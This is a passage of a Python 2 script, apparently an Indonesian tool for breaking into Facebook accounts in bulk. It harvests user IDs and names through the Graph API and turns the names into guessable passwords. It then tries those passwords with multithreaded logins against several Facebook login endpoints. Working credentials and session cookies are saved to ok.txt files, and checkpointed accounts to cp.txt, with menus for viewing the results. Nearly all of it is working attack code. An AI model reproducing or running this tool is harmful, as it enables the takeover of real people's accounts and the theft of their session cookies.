        r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
        z=json.loads(r.text)
        id = []
        qq = ("like.json").replace(" ","_")
        ys = open(qq, "w")#.replace(" ","_")
        for a in z["data"]:
            id.append(a["id"]+"<=>"+a["name"])
            ys.write(a["id"]+"<=>"+a["name"]+"\n")
        ys.close()
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Total ID: %s' % len(id)
        return methode(qq)
    except Exception as e:
        exit('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Error: %s' % e)

def mbasic(em, pas, hosts):
    r = requests.Session()
    r.headers.update(mbasic_h)
    p = r.get('https://mbasic.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return


def m_fb(em, pas, hosts):
    r = requests.Session()
    r.headers.update(m_fbh)
    p = r.get('https://m.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return


def touch_fb(em, pas, hosts):
    r = requests.Session()
    r.headers.update(touch_fbh)
    p = r.get('https://touch.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return


def graph_fb(em, pas, hosts):
    r = requests.Session()
    r.headers.update(mbasic_h)
    p = r.get('https://mbasic.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return


def generate(text):
    results = []
    for i in text.split(' '):
        if len(i) < 3:
            continue
        else:
            i = i.lower()
            if len(i) == 3 or len(i) == 4 or len(i) == 5:
                results.append(i + '123')
                results.append(i + '12345')
            else:
                results.append(i + '123')
                results.append(i + '12345')
                results.append(i)
                if 'indonesia' in ips:
                    results.append('sayang')
                    results.append('bangsat')
                    results.append('bismillah')

    return results

###### BRUTE FORCE #######

class crack:
    print ''
    def __init__(self,isifile):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Crack With Pass Default Or Manual [d/m]'
        while True:
            f = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose: ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '%s' % e
                    continue
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example : pass123,pass12345'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : mbasic/ok.txt'
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : mbasic/cp.txt'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'
                break

    def pwlist(self):
        self.pw = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password List: ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : mbasic/ok.txt'
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : mbasic/cp.txt'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = mbasic(fl.get('id'), i, 'https://mbasic.facebook.com')
                if log.get('status') == 'success':
                    print '\r \x1b[1;32m[OK]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (G, fl.get('id'), i, N)
                    self.ada.append('%s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('mbasic/ok.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r\x1b[1;33m [CP]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (O, fl.get('id'), i, N)
                    self.cp.append('%s|%s' % (fl.get('id'), i))
                    open('mbasic/cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r [Crack] %s/%s - Ok-:%s - Cp-:%s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)


class crack1:
    print ''
    def __init__(self,isifile):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Crack With Pass Default Or Manual [d/m]'
        while True:
            f = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose: ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '%s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example : pass123,pass12345'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : mfb/ok.txt'
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : mfb/cp.txt'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'
                break

    def pwlist(self):
        self.pw = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password List: ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : mfb/ok.txt'
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : mfb/cp.txt'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = m_fb(fl.get('id'), i, 'https://m.facebook.com')
                if log.get('status') == 'success':
                    print '\r \x1b[1;32m[OK]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (G, fl.get('id'), i, N)
                    self.ada.append('%s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('mfb/ok.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r \x1b[1;33m[CP]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (O, fl.get('id'), i, N)
                    self.cp.append('%s|%s' % (fl.get('id'), i))
                    open('mfb/cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r [Crack] %s/%s - Ok-:%s - Cp-:%s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)


class crack2:
    print ''
    def __init__(self,isifile):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Crack With Pass Default Or Manual [d/m]'
        while True:
            f = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose: ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk=isifile
                            self.fs=open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '%s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example : pass123,pass12345'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : touchfb/ok.txt'
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : touchfb/cp.txt'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'
                break

    def pwlist(self):
        self.pw = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password List: ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : touchfb/ok.txt'
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : touchfb/cp.txt'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = touch_fb(fl.get('id'), i, 'https://touch.facebook.com')
                if log.get('status') == 'success':
                    print '\r \x1b[1;32m[OK]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (G, fl.get('id'), i, N)
                    self.ada.append('%s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('touchfb/ok.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r \x1b[1;33m[CP]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (O, fl.get('id'), i, N)
                    self.cp.append('%s|%s' % (fl.get('id'), i))
                    open('touchfb/cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r [Crack] %s/%s - Ok-:%s - Cp-:%s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)

class freefb:
    print ''
    def __init__(self,isifile):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Crack With Pass Default Or Manual [d/m]'
        while True:
            f = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose: ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '%s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example : pass123,pass12345'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : freefb/ok.txt'
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : freefb/cp.txt'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'
                break

    def pwlist(self):
        self.pw = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password List: ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : freefb/ok.txt'
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : freefb/cp.txt'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = mbasic(fl.get('id'), i, 'https://free.facebook.com')
                if log.get('status') == 'success':
                    print '\r \x1b[1;32m[OK]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (G, fl.get('id'), i, N)
                    self.ada.append('%s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('freefb/ok.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r\x1b[1;33m [CP]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (O, fl.get('id'), i, N)
                    self.cp.append('%s|%s' % (fl.get('id'), i))
                    open('freefb/cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r [Crack] %s/%s - Ok-:%s - Cp-:%s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)

class crack3:
    print ''
    def __init__(self,isifile):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Crack With Pass Default Or Manual [d/m]'
        while True:
            f = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose: ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '%s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Example : pass123,pass12345'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = isifile
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue

                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : apifb/ok.txt'
                print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : apifb/cp.txt'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'
                break

    def pwlist(self):
        self.pw = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Password List: ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [OK] saved to : apifb/ok.txt'
            print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Account [CP] saved to : apifb/cp.txt'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Done Ya Anjing'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = graph_fb(fl.get('id'), i, 'https://graph.facebook.com')
                if log.get('status') == 'success':
                    print '\r \x1b[1;32m[OK]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (G, fl.get('id'), i, N)
                    self.ada.append('%s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('apifb/ok.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r\x1b[1;33m [CP]%s %s \xe2\x80\xa2 %s %s      \x1b[1;37m' % (O, fl.get('id'), i, N)
                    self.cp.append('%s|%s' % (fl.get('id'), i))
                    open('apifb/cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r [Crack] %s/%s - Ok-:%s - Cp-:%s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)

### Result Hasill ####



def results(kntl,zecheed):
        if len(kntl) !=0:
                print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] "+str(len(kntl))))
        if len(zecheed) !=0:
                print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] CP: "+str(len(zecheed))))
        if len(kntl) ==0 and len(zecheed) ==0:
                print("\n")
                print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))

### Pilih Result ###
def ress():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] RESULT CRACKER")
    print("\033[0;96m"+50*"-")
    print("\033[0;96m\033[0;97m [\033[1;36m1\033[1;37m] Cek Result Crack Mbasic.Facebook") 
    print("\033[0;96m\033[0;97m [\033[1;36m2\033[1;37m] Cek Result Crack M.Facebook") 
    print("\033[0;96m\033[0;97m [\033[1;36m3\033[1;37m] Cek Result Crack Touch.Facebook")
    print("\033[0;96m\033[0;97m [\033[1;36m4\033[1;37m] Cek Result Crack Api.Facebook")
    print("\033[0;96m\033[0;97m [\033[1;36m5\033[1;37m] Cek Result Crack Free.Facebook")
    print("\033[0;96m\033[0;97m [\033[1;36m0\033[1;37m] Back To Menu")
    pill = raw_input('\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Choose: ')
    if pill =="1" or pill =="01":
        result_mbasicc()
    elif pill =="2" or pill =="02":
        result_emefbi()
    elif pill =="3" or pill =="03":
        result_touchh()
    elif pill =="4" or pill =="04":
        result_apei()
    elif pill =="5" or pill =="05":
        result_freeefbi()
    elif pill =="0" or pill =="00":
        menu()
    else:
        print('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Keyword Salah!').format(R, N)
        ress()

### Result ###

def result_mbasicc():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Cracker Mbasic\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result OK "))
    try:
        os.system("cat mbasic/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result CP"))
    try:
        os.system("cat mbasic/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()

def result_emefbi():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Cracker M.Facebook\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result OK "))
    try:
        os.system("cat mfb/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result CP"))
    try:
        os.system("cat mfb/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()

def result_touchh():
    os.system('clear')
    print logo 
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Cracker Touch.Facebook\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result OK "))
    try:
        os.system("cat touchfb/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result CP"))
    try:
        os.system("cat touchfb/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()

def result_apei():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Cracker Api.Facebook\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result OK "))
    try:
        os.system("cat apifb/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result CP"))
    try:
        os.system("cat apifb/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()

def result_freeefbi():
    os.system('clear')
    print logo 
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Cracker Free.Facebook\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
